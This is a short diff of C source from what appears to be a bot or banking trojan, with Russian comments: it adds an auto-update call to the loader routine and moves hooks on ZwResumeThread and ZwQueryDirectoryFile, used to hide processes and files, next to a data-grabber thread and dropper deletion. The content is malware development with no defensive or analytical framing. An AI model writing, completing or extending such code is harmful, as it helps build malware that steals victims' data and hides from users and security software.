@@ -20,7 +20,6 @@
 #include "BotDef.h"
 #include "DbgRpt.h"
 #include "Modules.h"
-
 #include "BotDebug.h"
 
 
@@ -118,8 +117,12 @@ DWORD WINAPI LoaderRoutine( LPVOID lpData )
 	{
 		// Убиваем процесс svchost
 		pExitProcess(1);
-		return 0; // для компилятора
 	}
+
+	// Запускаем автообновление
+	#ifdef BotAutoUpdateH
+		StartAutoUpdate();
+	#endif
 
 	// Стартуем поток отправки данных
 
@@ -176,10 +179,6 @@ void ExplorerMain()
 
 	DeleteDropper();
 
-	HookZwResumeThread();
-	HookZwQueryDirectoryFile();
-
-	
 
 	//----------------------------------------------------
 
@@ -191,8 +190,11 @@ void ExplorerMain()
 			MegaJump( GrabberThread );
 	#endif
 
-
 	//MegaJump(AvFuckThread);
+	
+	// 
+	HookZwResumeThread();
+	HookZwQueryDirectoryFile();
 
 
 	// Вызываем событие мтарта експлорера
